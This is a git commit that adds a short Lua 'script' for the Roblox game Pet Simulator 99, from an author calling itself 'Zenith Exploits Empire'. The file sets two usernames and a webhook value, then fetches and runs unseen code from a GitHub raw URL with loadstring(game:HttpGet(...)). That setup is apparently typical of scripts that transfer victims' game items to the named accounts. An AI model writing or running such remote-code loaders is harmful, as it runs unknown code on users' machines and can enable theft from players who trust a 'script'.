73d7be554f02377a9007ad9fb21ff764d50db886
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-23 01:42:03 +0200

    Added ps99 script: Petsimulator99scripts

---
+++ ps99/Petsimulator99scripts.lua
@@ -0,0 +1,5 @@
+Username = "rfgjkgc"
+Username2 = "Kherkher10"
+Webhook = "26513227165263"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20Pet%20Simulator%2099"))()
